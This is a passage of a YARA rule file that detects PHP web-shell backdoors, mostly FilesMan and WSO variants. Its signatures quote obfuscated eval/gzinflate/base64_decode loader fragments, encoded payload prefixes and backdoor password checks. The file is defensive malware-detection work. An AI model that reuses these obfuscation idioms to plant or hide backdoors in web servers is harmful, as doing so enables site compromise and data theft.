    condition:
        $trigger and PR00029 and PR02318 and PR01422
}

private rule PR02319 : trigger
{
    strings:
        $ps0 = "<< 8) + ord("
    condition:
        $ps0
}

private rule PR02320 : trigger
{
    strings:
        $ps0 = "= range(\""
    condition:
        $ps0
}

rule php_backdoor_filesman_053 : backdoor
{
    strings:
        $trigger = "\";eval("
    condition:
        $trigger and PR02319 and PR02320
}

private rule PR02321 : trigger
{
    strings:
        $ps0 = "\\x7a\\151\";exit;"
    condition:
        $ps0
}

rule php_backdoor_filesman_054 : backdoor
{
    strings:
        $trigger = "8WIasekXis7kuVk=\";$"
    condition:
        $trigger and PR02321 and PR01932
}

rule php_backdoor_filesman_055 : backdoor
{
    strings:
        $trigger = "$part2='MVViR2xaVkdoc1RucFZNbGxxVVROYWFrRnBUM2R2YTFreU9"
    condition:
        $trigger and PR00029
}

rule php_backdoor_filesman_056 : backdoor
{
    strings:
        $trigger = "GR5yYXp3YH17ejRne3h9cGdgdWBxPDB5dX9xYWQ9NG8Z"
    condition:
        $trigger and PR02292 and PR02127
}

private rule PR02322 : trigger
{
    strings:
        $ps0 = "echo eval(base64_decode(str_replace("
    condition:
        $ps0
}

rule php_backdoor_filesman_057 : backdoor
{
    strings:
        $trigger = "@unlink("
    condition:
        $trigger and PR02322 and PR00391
}

rule php_backdoor_filesman_058 : backdoor
{
    strings:
        $trigger = "eval(base64_decode(\"JGFyclswXT0iQ2lSaGRYUm9YM0JoYzN"
    condition:
        $trigger
}

private rule PR02323 : trigger
{
    strings:
        $ps0 = "(get_token($CERTIFICATE))))));"
    condition:
        $ps0
}

rule php_backdoor_filesman_059 : backdoor
{
    strings:
        $trigger = "$activate_ssl = activate_ssl();"
    condition:
        $trigger and PR00029 and PR02323
}

rule php_backdoor_filesman_060 : backdoor
{
    strings:
        $trigger = "eval(x0b($secure));"
    condition:
        $trigger and PR01436
}

rule php_backdoor_filesman_061 : backdoor
{
    strings:
        $trigger = "eval(base64_decode(\"IGVycm9yX3JlcG9ydGluZygwKTsNC"
    condition:
        $trigger
}

private rule PR02324 : trigger
{
    strings:
        $ps0 = "chmod($_SERVER['SCRIPT_FILENAME"
    condition:
        $ps0
}

rule php_backdoor_filesman_062 : backdoor
{
    strings:
        $trigger = "filemtime($_SERVER['DOCUMENT_ROOT"
    condition:
        $trigger and PR02324 and PR00029 and PR01422
}

private rule PR02325 : trigger
{
    strings:
        $ps0 = "\\x65\\x76\\x61\\x6C\\x28\\x67\\x7A\\x69\\x6E\\x66\\x6C\\x61\\x74\\x65\\x28\\x62\\x61\\x73\\x65\\x36\\x34\\x5F\\x64\\x65\\x63\\x6F\\x64\\x65\\x28"
    condition:
        $ps0
}

rule php_backdoor_filesman_064 : backdoor
{
    strings:
        $trigger = "$auth_pass"
    condition:
        $trigger and PR02325 and PR02292
}

rule php_backdoor_filesman_065 : backdoor
{
    strings:
        $trigger = "eval(gzinflate(base64_decode('5b1rdxrHEij62Xut/R9aE3YGYoQA2Y6DBJItS7"
    condition:
        $trigger
}

rule php_backdoor_filesman_066 : backdoor
{
    strings:
        $trigger = "ZXZhbChiYXNlNjRfZGVjb2RlKCdKRjg1Y1cxTFdYTTlJblYzYlRVN"
    condition:
        $trigger and PR01353
}

rule php_backdoor_filesman_067 : backdoor
{
    strings:
        $trigger = "=__STUPID__;"
    condition:
        $trigger and PR00029 and PR01422
}

rule php_backdoor_filesman_068 : backdoor
{
    strings:
        $trigger = "JGxMOXdGMWFZNHpYNmpUMWdUNmdRN2xPMGtIMGdCNW9OOG1ZOG5COH"
    condition:
        $trigger and PR00029 and PR01422
}

private rule PR02326 : trigger
{
    strings:
        $ps0 = "TwsGZCk38vaxYIpKTbjOW2ydQUov2VymfSZsxwEkUeeNNyfiYA1qGA"
    condition:
        $ps0
}

rule php_backdoor_filesman_069 : backdoor
{
    strings:
        $trigger = "base64_decode"
    condition:
        $trigger and PR02326 and PR00029
}

private rule PR02327 : trigger
{
    strings:
        $ps0 = "O2V2YWwoYmFzZTY0X2RlY29kZSgiSkd4c2JHeHNiR3hzYkd4c1BTZGlZWE5sTmpSZlpHVmpiMlJsSnpzPSIpKTskb"
    condition:
        $ps0
}

rule php_backdoor_filesman_070 : backdoor
{
    strings:
        $trigger = "QAAAOzh3b3cKDQoNI2Zyc29"
    condition:
        $trigger and PR00029 and PR01422 and PR02327
}

private rule PR02328 : trigger
{
    strings:
        $ps0 = "if( preg_match_all(':>([^<]+)<:s', php_strip_whitespace(__FILE__), $"
    condition:
        $ps0
}

rule php_backdoor_filesman_071 : backdoor
{
    strings:
        $trigger = "preg_replace"
    condition:
        $trigger and PR02325 and PR02328
}

private rule PR02329 : trigger
{
    strings:
        $ps0 = "tree_plus($_SESSION['tree'], $_SESSION['hassubdirs'], $treeroot);"
    condition:
        $ps0
}

rule php_backdoor_filesman_072 : backdoor
{
    strings:
        $trigger = "(!empty($_GET['symlinktarget']) && empty($_GET['symlink']))"
    condition:
        $trigger and PR01332 and PR02329
}

private rule PR02330 : trigger
{
    strings:
        $ps0 = "GprdHdiZG5ma2RvUmAvI0BLAD5IRUZLVFwgZHBjUyHu4Al"
    condition:
        $ps0
}

rule php_backdoor_filesman_073 : backdoor
{
    strings:
        $trigger = "O2V2YWwoYmFzZTY0X2RlY29kZSgiSkd4c2JHeHNiR3hzYkd4c1BTZGlZWE5sTmpSZlpHVmpiMlJsSnpzPSIpKTskb"
    condition:
        $trigger and PR00029 and PR02330 and PR01422
}

private rule PR02331 : trigger
{
    strings:
        $ps0 = "R3mm/Z/1+x2rPt3LP7N0Kwnsf0WZT0X557/+EJNV7iY33LtoBGYprGtJbdC2WHOW"
    condition:
        $ps0
}

rule php_backdoor_filesman_074 : backdoor
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR02331 and PR00029
}

rule php_backdoor_filesman_075 : backdoor
{
    strings:
        $trigger = "eval(gzinflate(base64_decode('TZzXrvPsdp3PA+QejD8GnIRO2BsMH4hd7L1hAxvsReydvPrw8zYQHwhaFMkl8n3nHOMZEq"
    condition:
        $trigger
}

rule php_backdoor_filesman_076 : backdoor
{
    strings:
        $trigger = "eval(gzinflate(base64_decode(\"HZzHkuNQdgV/ZXYzE1jAu5BCE/CW8JYbBbz3Hl8vlhbdm64iAbx3z8lkg/jP"
    condition:
        $trigger
}

rule php_backdoor_filesman_077 : backdoor
{
    strings:
        $trigger = "eval(gzinflate(base64_decode(rawurldecode('5b1rWxs3EzD8GX6F2Pru2o0xtknSFGNCQiAhTSDlkKQJedy1vba3rL3u7"
    condition:
        $trigger
}

private rule PR02332 : trigger
{
    strings:
        $ps0 = "jVRpc5s6FP3ODP9BbTMFT/IKOMYmiZc6jrcY70vi"
    condition:
        $ps0
}

rule php_backdoor_filesman_078 : backdoor
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR00029 and PR02332
}

private rule PR02333 : trigger
{
    strings:
        $ps0 = "7L12attTsjD82Tkn/wHh+I7sK1sEN1a0LUK4E9xKQ3EyxweACGPFUxA"
    condition:
        $ps0
}

rule php_backdoor_filesman_079 : backdoor
{
    strings:
        $trigger = "base64_decode"
    condition:
        $trigger and PR00029 and PR02333
}

rule php_backdoor_filesman_080 : backdoor
{
    strings:
        $trigger = "RmlsZXNNYW4"
    condition:
        $trigger and PR00029 and PR01422
}

private rule PR02334 : trigger
{
    strings:
        $ps0 = "($_REQUEST[\"bckdrprm\"]!=\"hackmeplz\""
    condition:
        $ps0
}

rule php_backdoor_filesman_081 : backdoor
{
    strings:
        $trigger = "bckdrprm\"]!=\"hackmeplz\") ) { ?>"
    condition:
        $trigger and PR00029 and PR01422 and PR02334
}

private rule PR02335 : trigger
{
    strings:
        $ps0 = "<?} else { if( isset( $_REQUEST[\"one\"]"
    condition:
        $ps0
}

rule php_backdoor_filesman_081_02 : backdoor
{
    strings:
        $trigger = "bckdrprm\"]!=\"hackmeplz\") ) { ?>"
    condition:
        $trigger and PR02335 and PR00029 and PR01422
}

rule php_backdoor_filesman_082 : backdoor
{
    strings:
        $trigger = "eval(gzinflate(base64_decode(\"1X39e9q40ujP3efZ"
    condition:
        $trigger
}

rule php_backdoor_filesman_083 : backdoor
{
    strings:
        $trigger = "7b3rdts4syD6f9aad6DZ/ppSR5Yl2U4ntuXE8S1OHNvxJc51qymKk"
    condition:
        $trigger and PR00029 and PR01422
}

rule php_backdoor_filesman_084 : backdoor
{
    strings:
        $trigger = "eval(gzinflate(str_rot13(base64_decode('FJ3Hj"
    condition:
        $trigger
}

rule php_backdoor_filesman_084_02 : backdoor
{
    strings:
        $trigger = "eval(str_rot13(gzinflate(str_rot13(base64_decode($"
    condition:
        $trigger
}

private rule PR02336 : trigger
{
    strings:
        $ps0 = "FilesMen()"
    condition:
        $ps0
}

rule php_backdoor_filesman_085 : backdoor
{
    strings:
        $trigger = "isset($_POST["
    condition:
        $trigger and PR02336 and PR01789 and PR01746
}

rule php_backdoor_filesman_086 : backdoor
{
    strings:
        $trigger = "function findshells($start"
    condition:
        $trigger
}

private rule PR02337 : trigger
{
    strings:
        $ps0 = "$arr_files = DirFilesR($_SERVER['DOCUMENT_ROOT']);"
    condition:
        $ps0
}

rule php_backdoor_filesman_086_02 : backdoor
{
    strings:
        $trigger = "echo $key"
    condition:
        $trigger and PR02337
}

rule php_backdoor_filesman_087 : backdoor
{
    strings:
        $trigger = "7X1td9rIkvDn+eD5DdwIK4AhNjYCgxMYZ5zJ6zzXuZNN7MWzIBhZgFAsjEYan"
    condition:
        $trigger and PR00029 and PR01422
}

rule php_backdoor_filesman_088 : backdoor
{
    strings:
        $trigger = "eval(gzuncompress(base64_decode($sempax)));"
    condition:
        $trigger
}

rule php_backdoor_filesman_089 : backdoor
{
    strings:
        $trigger = "5b1rexo3EzD82fkV8pa7Cw3GgJM0NYYcHDtxmtipD0maOA9dYIGtF5buLsZO6v"
    condition:
        $trigger and PR00029 and PR01422
}

private rule PR02338 : trigger
{
    strings:
        $ps0 = "array('!', '@', '#"
    condition:
        $ps0
}

rule php_backdoor_filesman_090 : backdoor
{
    strings:
        $trigger = "$newtext = str_replace($arr2,$arr1,$text);"
    condition:
        $trigger and PR02338 and PR01398
}

private rule PR02339 : trigger
{
    strings:
        $ps0 = "FkEOJA5jzx4HLNxCJq0s3quUHQwXN3B0sVgU"
    condition:
        $ps0
}

rule php_backdoor_filesman_091 : backdoor
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR00029 and PR02339
}

// MANUAL FIX NECESSARY
rule php_backdoor_filesman_092 : backdoor
{
    strings:
        $trigger = "base64_decode"
        $php_backdoor_filesman_092_r0 = /\);[\s]*eval\(\$[\w]{200}/
    condition:
        $trigger and PR00029 and $php_backdoor_filesman_092_r0
}

// MANUAL FIX NECESSARY
rule php_backdoor_filesman_093 : backdoor
{
    strings:
        $trigger = ".="
        $php_backdoor_filesman_093_r0 = /foreach[\s]*\([\s]*(\[|array\()[\d]+,/
        $php_backdoor_filesman_093_r1 = /\.[\s]*['\"]c['\"][\s]*\./
        $php_backdoor_filesman_093_r2 = /foreach\((array\(|\[)[\d]+,[\s]*[\d]+,[^\)]+(\)|\]) as \$[\w]+\)[\s]*\{[\s]*\$[\w]+[\s]*\.=[\s]*\$[\w]+\[\$[\w]+\];[\s]*\}[\s]*\$[\w]+[\s]*=[\s]*\$[\w]+\(['\._noitcufear]{80}/
    condition:
        $trigger and PR01692 and PR01962 and $php_backdoor_filesman_093_r0 and $php_backdoor_filesman_093_r1 and $php_backdoor_filesman_093_r2
}

rule php_backdoor_filesman_094 : backdoor
{
    strings:
        $trigger = "fwrite($fp, print_r($output, TRUE)); fclose($fp); ob_end_clean(); eval"
    condition:
        $trigger and PR01693
}

private rule PR02340 : trigger
{
    strings:
        $ps0 = "fkAkDkfVNH5usEDYuW3XwGjNh1k3y8IwICO1g75xTB8gyfGehnjwygO+GS"
    condition:
        $ps0
}

rule php_backdoor_filesman_095 : backdoor
{
    strings:
        $trigger = "gzuncompress"
    condition:
        $trigger and PR02340
}

private rule PR02341 : trigger
{
    strings:
        $ps0 = "=chop($value,\"\\151\\156\\147\");"
    condition:
        $ps0
}

private rule PR02342 : trigger
{
    strings:
        $ps0 = "].substr($"
    condition:
        $ps0
}

rule php_backdoor_filesman_096 : backdoor
{
    strings:
        $trigger = "=rtrim($"
    condition:
        $trigger and PR00029 and PR02341 and PR02342
}

rule php_backdoor_filesman_098 : backdoor
{
    strings:
        $trigger = "= 'FilesMan'"
    condition:
        $trigger
}

rule php_backdoor_filesman_100 : backdoor
{
    strings:
        $trigger = "\\x2e1\");if(get_magic_quotes_gpc()){function WSOstripslashes($array){${\"\\x"
    condition:
        $trigger and PR00029 and PR00507
}

private rule PR02343 : trigger
{
    strings:
        $ps0 = ";if(get_magic_quotes_gpc()){function WSOstripslashes($array){${\"\\x"
    condition:
        $ps0
}

rule php_backdoor_filesman_100_02 : backdoor
{
    strings:
        $trigger = "$_POST=WSOstripslashes($_POST);}function wsoLogin(){die"
    condition:
        $trigger and PR02343 and PR00029
}

rule php_backdoor_filesman_101 : backdoor
{
    strings:
        $trigger = "#df5"
    condition:
        $trigger and PR02292 and PR02127
}

// MANUAL FIX NECESSARY
rule php_backdoor_filesman_101_02 : backdoor
{
    strings:
        $trigger = "$auth_pass"
        $php_backdoor_filesman_101_02_r0 = /auth_pass[^\}]+exit;/
        $php_backdoor_filesman_101_02_r1 = /default_charset=[^;]+;[\s]*exit;[\s]*\}/
    condition:
        $trigger and PR02292 and $php_backdoor_filesman_101_02_r0 and $php_backdoor_filesman_101_02_r1
}

private rule PR02344 : trigger
{
    strings:
        $ps0 = "gFYfxUK4iGRtEpCkuhzFqGQaUALI6ugVwCTk"
    condition:
        $ps0
}

rule php_backdoor_filesman_101_03 : backdoor
{
    strings:
        $trigger = "));$"
    condition:
        $trigger and PR02344 and PR01335
}

rule php_backdoor_filesman_101_04 : backdoor
{
    strings:
        $trigger = "payleets"
    condition:
        $trigger and PR01398
}

rule php_backdoor_filesman_102 : backdoor
{
    strings:
        $trigger = "\\x62\\x61\\x73\\x65\\x36\\x34"
    condition:
        $trigger and PR01421
}

private rule PR02345 : trigger
{
    strings:
        $ps0 = "@ini_set('display_errors',"
    condition:
        $ps0
}

rule php_backdoor_filesman_103 : backdoor
{
    strings:
        $trigger = "@ini_set('output_buffering',"
    condition:
        $trigger and PR00029 and PR01422 and PR01372 and PR02345
}

private rule PR02346 : trigger
{
    strings:
        $ps0 = "$__raw_val = ($__funct_gz($__funct_b("
    condition:
        $ps0
}

rule php_backdoor_filesman_104 : backdoor
{
    strings:
        $trigger = "strre"
    condition:
        $trigger and PR02346
}

// MANUAL FIX NECESSARY
rule php_backdoor_filesman_105 : backdoor
{
    strings:
        $trigger = "$auth_pass = \""
        $php_backdoor_filesman_105_r0 = /\$auth_pass[\s]*=[\s]*['\"][\w]{20,}['\"];[\s]*\$[\w]+[\s]=[\s]*['\"][^;]{4000}[^;]+;[\s]*eval[^\)]+\$[\w]+[\)\s]+;/
    condition:
        $trigger and $php_backdoor_filesman_105_r0
}

rule php_backdoor_filesman_106 : backdoor
{
    strings:
        $trigger = ";preg_replace('/.*/e',\"\\x65\\x76\\x61\\x6c\\x28\\x62\\x61\\x73\\x65\\x36\\x34\\x5f\\x64\\x65\\x63\\x6f\\x64\\x65\\x28\\x67\\x7a\\x69\\x6e\\x66\\x6c\\x61\\x74\\x65\\x28\\x62\\x61\\x73\\x65\\x36\\x34\\x5f\\x64\\x65\\x63\\x6f\\x64\\x65\\x28\\x24"
    condition:
        $trigger
}

private rule PR02347 : trigger
{
    strings:
        $ps0 = "function actionFilesWin()"
    condition:
        $ps0
}

rule php_backdoor_filesman_108 : backdoor
{
    strings:
        $trigger = "exit;"
    condition:
        $trigger and PR02056 and PR02347
}

rule php_backdoor_filesman_109 : backdoor
{
    strings:
        $trigger = "ziugfxojvn');@eval(@gzuncompress("
    condition:
        $trigger and PR01422
}

rule php_backdoor_filesman_110 : backdoor
{
    strings:
        $trigger = "JGRlZmF1bHRfYWN0aW9uID0gJ0ZpbGVzTWFuJzsKJGRlZmF1bHRfdXNlX2FqYXggPSB0cnVlOw"
    condition:
        $trigger and PR01398
}

rule php_backdoor_filesman_111 : backdoor
{
    strings:
        $trigger = "\\x24\\x70\\x61\\x79\\x6c\\x6f\\x61\\x64\\x29\\x2c\\x30\\x29\\x29\\x29"
    condition:
        $trigger and PR01179
}

// MANUAL FIX NECESSARY
rule php_backdoor_filesman_112 : backdoor
{
    strings:
        $trigger = "].$"
        $php_backdoor_filesman_112_r0 = /<\?php[\s]*\/\*[\w]+\*\/[\s]*\?>[\s]*<\?php[\s]*\$[\w]+[\s]*=[\s]*\"[^\"]+\";[\s]*function [\w]+\(\$[\w],[\s]*\$[\w],[\s]*\$[\w]\)[\s]*\{[\s]*return[\s]*[^;]+''[\s]*\.[^;]+;[\s]*\}/
    condition:
        $trigger and $php_backdoor_filesman_112_r0
}

rule php_backdoor_filesman_113 : backdoor
{
    strings:
        $trigger = "ZXZhbChzdHJyZXYoICc7KSkgIjdrU0tnY1NaMkZHYm9NSGR5OWxjdlJYTXpnQ0lud2x"
    condition:
        $trigger and PR00029 and PR01422
}

private rule PR02348 : trigger
{
    strings:
        $ps0 = "LyhwcmludHxzcHJpbnR8ZWNobykv"
    condition:
        $ps0
}

rule php_backdoor_filesman_114 : backdoor
{
    strings:
        $trigger = "Xtea"
    condition:
        $trigger and PR00029 and PR01422 and PR02348 and PR01748
}

rule php_backdoor_filesman_115 : backdoor
{
    strings:
        $trigger = "HJ1X0qNGFIXfZxcIkUQSIJGjyDnn0Ox/Fe7f5fKDa8yo6b73nO8QmnJ3Zk23"
    condition:
        $trigger and PR01398
}

rule php_backdoor_filesman_116 : backdoor
{
    strings:
        $trigger = "PHRpdGxlPlRyeWFnIEZpbGUgTWFuYWdlcjwvdGl0bGU+"
    condition:
        $trigger and PR01479
}

private rule PR02349 : trigger
{
    strings:
        $ps0 = "uDMexbrC8aXiXU6ikyoauh5VAVYE3d27YGH71PRfAPd1nl5Y1szyqBhE"
    condition:
        $ps0
}

rule php_backdoor_filesman_117 : backdoor
{
    strings:
        $trigger = "if ($_SERVER[\"QUERY_STRING\"])"
    condition:
        $trigger and PR02349 and PR01016
}

rule php_backdoor_filesman_118 : backdoor
{
    strings:
        $trigger = "7b17e9s4rjj899nnOd+B1WRH9tRxbCfpxYmdprk1bZq2ubSdNv1lZU"
    condition:
        $trigger and PR00029 and PR01422
}

rule php_backdoor_filesman_119 : backdoor
{
    strings:
        $trigger = "eval($gzc($b64($r13"
    condition:
        $trigger and PR01450
}

rule php_backdoor_filesman_120 : backdoor
{
    strings:
        $trigger = ", $_COOKIE['session_http'], NULL); file_put_contents("
    condition:
        $trigger and PR01678 and PR00397
}

rule php_backdoor_filesman_121 : backdoor
{
    strings:
        $trigger = "O6a1+Pl9Tn1yT8aIhmHtNAq1eNB7EptJ55vVsOfeUbqvHIvgXoIblD"
    condition:
        $trigger and PR01398
}

rule php_backdoor_filesman_122 : backdoor
{
    strings:
        $trigger = "str_replace(\"[t1]\", \"<?\", $resource_crypted_code);"
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
private rule PR02350 : trigger
{
    strings:
        $ps0 = "ecalper_rts"
    condition:
        $ps0
}

private rule PR02351 : trigger
{
    strings:
        $ps0 = "etalfnizg"
    condition:
        $ps0
}

rule php_backdoor_filesman_123 : backdoor
{
    strings:
        $trigger = "edoced_46esab"
        $php_backdoor_filesman_123_r0 = /\.\s*chr\(\d+\)\s*\./
    condition:
        $trigger and PR01396 and PR02350 and PR02351 and $php_backdoor_filesman_123_r0
}

rule php_backdoor_filesman_124 : backdoor
{
    strings:
        $trigger = "rename($_POST[\"old_name\"], $_POST[\"folder_name\"]);"
    condition:
        $trigger and PR00039
}

rule php_backdoor_filesman_125 : backdoor
{
    strings:
        $trigger = "Hf6Q3JoEf9inR4wsC2jG4sLpGTJnP60PLnsRvK9OQe"
    condition:
        $trigger and PR00029 and PR01422
}

rule php_backdoor_filesman_126 : backdoor
{
    strings:
        $trigger = "5b14ShvH0ij82Xut/R+GiZKRbyEkbns"
    condition:
        $trigger and PR00029 and PR01422
}

rule php_backdoor_filesman_127 : backdoor
{
    strings:
        $trigger = "ZXJyb3JfcmVwb3J0aW5nKDApOwpzZXRfdGltZV9saW1pdCgwKTsKCm"
    condition:
        $trigger and PR00029 and PR01422
}

private rule PR02352 : trigger
{
    strings:
        $ps0 = "eval(base64_decode('aWYoJGF1dGggPT0gMSkgewppZiAoIWlzc2V0KCRfU0VSVkVSWydQSFBfQVVUSF9VU0VSJ1"
    condition:
        $ps0
}

rule php_backdoor_filesman_128 : backdoor
{
    strings:
        $trigger = "$auth = 1;"
    condition:
        $trigger and PR02352
}

rule php_backdoor_filesman_129 : backdoor
{
    strings:
        $trigger = "7b3tctu4sij6O6tqvQ"
    condition:
        $trigger and PR01350
}

private rule PR02353 : trigger
{
    strings:
        $ps0 = ");@eval(@gzuncompress($x));"
    condition:
        $ps0
}

rule php_backdoor_filesman_130 : backdoor
{
    strings:
        $trigger = "$x.="
    condition:
        $trigger and PR02353
}

rule php_backdoor_filesman_131 : backdoor
{
    strings:
        $trigger = "rX0Ne9rGEu5fUdScAq2N+SY1xolr48S3ju0D+LS9SR6OAGHUACK"
    condition:
        $trigger and PR01480
}

rule php_backdoor_filesman_132 : backdoor
{
    strings:
        $trigger = "eval('?>'.base64_decode('PD9waHANCkBzZXNzaW9uX3N0YXJ0KCk7DQpAc2V0X3RpbWVfbGltaXQoMCk7DQoN"
    condition:
        $trigger
}

private rule PR02354 : trigger
{
    strings:
        $ps0 = ",array('','}'.$"
    condition:
        $ps0
}

private rule PR02355 : trigger
{
    strings:
        $ps0 = "($fu, $ck, $you){return"
    condition:
        $ps0
}

rule php_backdoor_filesman_133 : backdoor
{
    strings:
        $trigger = "));$"
    condition:
        $trigger and PR02354 and PR02355
}

// MANUAL FIX NECESSARY
private rule PR02356 : trigger
{
    strings:
        $ps0 = "$_POST"
    condition:
        $ps0
}

rule php_backdoor_filesman_134 : backdoor
{
    strings:
        $trigger = "exec"
        $php_backdoor_filesman_134_r0 = /defined[\s]*\(.FM_HIGHLIGHTJS_STYLE.\)[\s]*\|\|[\s]*define[\s]*\(.FM_HIGHLIGHTJS_STYLE.[\s]*,[\s]*\$highlightjs_style\);/
    condition:
        $trigger and PR00013 and PR02356 and PR01021 and $php_backdoor_filesman_134_r0
}

rule php_backdoor_filesman_135 : backdoor
{
    strings:
        $trigger = "= \"?>$"
    condition:
        $trigger and PR01480 and PR01550
}

rule php_backdoor_filesman_136 : backdoor
{
    strings:
        $trigger = "ZXZhbChldmFsKGV2YWwoZXZhbChldmFsKGV2YWwoZXZhbChldmFsKGV2YWwoZXZhbChldmFsKGV2YWwoZXZ"
    condition:
        $trigger and PR01398
}

// MANUAL FIX NECESSARY
private rule PR02357 : trigger
{
    strings:
        $ps0 = "filesize($"
    condition:
        $ps0
}

rule php_backdoor_filesman_137 : backdoor
{
    strings:
        $trigger = "base64_decod"
        $php_backdoor_filesman_137_r0 = /function[\s]*[\w]+\(\$[\w]+\)[\s]*\{[\s]*\$[\w]+[\s]*=[\s]*.[\w]*.;[\s]*if\(file_exists\(\$[\w]+\)\)[\s]*\{[\s]*\$[\w]+[\s]*=[\s]*fopen\(\$[\w]+,[\s]*.[\w]+.\);[\s]*\$[\w]+[\s]*=[\s]*fread\(\$[\w]+,[\s]*filesize\(\$[\w]+\)\);[\s]*fclose\(\$[\w]+\);/
    condition:
        $trigger and PR01543 and PR02357 and PR01403 and PR01415 and $php_backdoor_filesman_137_r0
}

rule php_backdoor_filesman_138 : backdoor
{
    strings:
        $trigger = "ZnVuY3Rpb24gX3VMRWQoJF8zZmthbWh6aSl7JF8z"
    condition:
        $trigger and PR01398
}

private rule PR02358 : trigger
{
    strings:
        $ps0 = ")));\");"
    condition:
        $ps0
}

private rule PR02359 : trigger
{
    strings:
        $ps0 = "(isset ($_GET['check']))"
    condition:
        $ps0
}

rule php_backdoor_filesman_139 : backdoor
{
    strings:
        $trigger = "echo \"checked\";"
    condition:
        $trigger and PR02358 and PR02359 and PR01746
}

private rule PR02360 : trigger
{
    strings:
        $ps0 = "htmlspecialchars(file_get_contents($_GET[file]))"
    condition:
        $ps0
}

rule php_backdoor_filesman_140 : backdoor
{
    strings:
        $trigger = "fopen"
    condition:
        $trigger and PR02360 and PR00355 and PR01392
}

private rule PR02361 : trigger
{
    strings:
        $ps0 = "if ($doing == 'downfile' && $thefile) {"
    condition:
        $ps0
}

rule php_backdoor_filesman_141 : backdoor
{
    strings:
        $trigger = "exit;"
    condition:
        $trigger and PR00039 and PR02056 and PR02361
}

rule php_backdoor_filesman_142 : backdoor
{
    strings:
        $trigger = "@eval($"
    condition:
        $trigger and PR01421
}

private rule PR02362 : trigger
{
    strings:
        $ps0 = "GMINC90LUg0YPQvNC10YAhICov"
    condition:
        $ps0
}

rule php_backdoor_filesman_143 : backdoor
{
    strings:
        $trigger = "(base64_decode("
    condition:
        $trigger and PR01398 and PR02362
}

private rule PR02363 : trigger
{
    strings:
        $ps0 = "ZXZhbChldmFsKGV2YWwoZXZhbChldmFsKGV2YWwoZXZ"
    condition:
        $ps0
}

rule php_backdoor_filesman_144 : backdoor
{
    strings:
        $trigger = "eval(base64_decode('ZnVuY3Rpb2"
    condition:
        $trigger and PR02363
}

private rule PR02364 : trigger
{
    strings:
        $ps0 = ".= chr((ord(substr($"
    condition:
        $ps0
}

rule php_backdoor_filesman_145 : backdoor
{
    strings:
        $trigger = "base64_decode"
    condition:
        $trigger and PR00029 and PR02364
}

// MANUAL FIX NECESSARY
private rule PR02365 : trigger
{
    strings:
        $ps0 = "(\"\",\"};\""
    condition:
        $ps0
}

private rule PR02366 : trigger
{
    strings:
        $ps0 = "(\"#/\\*\\*(.*)\\*\\*/#s\""
    condition:
        $ps0
}

rule php_backdoor_filesman_146 : backdoor
{
    strings:
        $trigger = "(__FILE__)),$match)?($match[1]):\"\").\"//\");"
        $php_backdoor_filesman_146_r0 = /\^['\"]/
    condition:
        $trigger and PR02365 and PR02366 and $php_backdoor_filesman_146_r0
}

rule php_backdoor_filesman_147 : backdoor
{
    strings:
        $trigger = "eval(\"\\145\\166\\141\\154\\050\\142\\141\\163\\145\\066\\064\\137\\144\\145\\143\\157\\144\\145\\050\\163\\164\\162\\162\\145\\166\\050"
    condition:
        $trigger and PR01421
}

rule php_backdoor_filesman_148 : backdoor
{
    strings:
        $trigger = "eval(gzinflate"
    condition:
        $trigger and PR01421
}

private rule PR02367 : trigger
{
    strings:
        $ps0 = "7X1te9s2suh3"
    condition:
        $ps0
}

rule php_backdoor_filesman_149 : backdoor
{
    strings:
        $trigger = "strre"
    condition:
        $trigger and PR02367 and PR01488
}

private rule PR02368 : trigger
{
    strings:
        $ps0 = "rf77if/7nf76fd9Xbf/03"
    condition:
        $ps0
}

private rule PR02369 : trigger
{
    strings:
        $ps0 = "));__halt_compiler();"
    condition:
        $ps0
}

rule php_backdoor_filesman_151 : backdoor
{
    strings:
        $trigger = "file(__FILE__);eval(base64_decode("
    condition:
        $trigger and PR02368 and PR02369
}

private rule PR02370 : trigger
{
    strings:
        $ps0 = "8yKa8+OdLRv93K022gsD+//7/vrh/vR/vX1/N/u//AA"
    condition:
        $ps0
}

rule php_backdoor_filesman_152 : backdoor
{
    strings:
        $trigger = "file(__FILE__);eval(base64_decode("
    condition:
        $trigger and PR02370 and PR02369
}

private rule PR02371 : trigger
{
    strings:
        $ps0 = "file(__FILE__);eval(base64_decode("
    condition:
        $ps0
}

rule php_backdoor_filesman_153 : backdoor
{
    strings:
        $trigger = "3NkaLEmYKjO4AzqBRGMjQAjNkGSDQAJ20fPrb0RkpjokwFVe++zznT3wYxvUZBMZfbzx"
    condition:
        $trigger and PR02369 and PR02371
}

// MANUAL FIX NECESSARY
rule php_backdoor_filesman_154 : backdoor
{
    strings:
        $trigger = "N1Azcmt1SlZ0aWdNL3E1"
        $php_backdoor_filesman_154_r0 = /[bB][aA][sS][eE]64_[dD][eE][cC][oO][dD][eE]\(/
    condition:
        $trigger and PR00029 and $php_backdoor_filesman_154_r0
}

private rule PR02372 : trigger
{
    strings:
        $ps0 = "define('FM_SESSION_ID', 'filemanager');"
    condition:
        $ps0
}

rule php_backdoor_filesman_155 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00355 and PR02372 and PR00357
}

rule php_backdoor_filesman_156 : backdoor
{
    strings:
        $trigger = "SkdSbFptRjFiSFJmZFhObFgyRnFZWGdnUFNCMGNuVmxP"
    condition:
        $trigger and PR01398
}

// MANUAL FIX NECESSARY
rule php_backdoor_filesman_157 : backdoor
{
    strings:
        $trigger = "array('b' ,'a' ,'s' ,'e' ,'6' ,'4"
        $php_backdoor_filesman_157_r0 = /\.\s*chr\(\d+\)\s*\./
    condition:
        $trigger and PR01396 and $php_backdoor_filesman_157_r0
}

private rule PR02373 : trigger
{
    strings:
        $ps0 = "BoSytlVDJtb21vR0MrbUVNNVYvRkRCd0gyZmxSN2dvRWphaWJrNm52WFNvZi95dGVUVHRLYzJjZkpr"
    condition:
        $ps0
}

rule php_backdoor_filesman_158 : backdoor
{
    strings:
        $trigger = "[PHPkoru_Info]"
    condition:
        $trigger and PR01398 and PR02373
}

private rule PR02374 : trigger
{
    strings:
        $ps0 = "6rPGvFqUU4RxgpYScVlcVkbxhOHD7XkOGok"
    condition:
        $ps0
}

rule php_backdoor_filesman_159 : backdoor
{
    strings:
        $trigger = "urldecode("
    condition:
        $trigger and PR00029 and PR02374
}

rule php_backdoor_filesman_161 : backdoor
{
    strings:
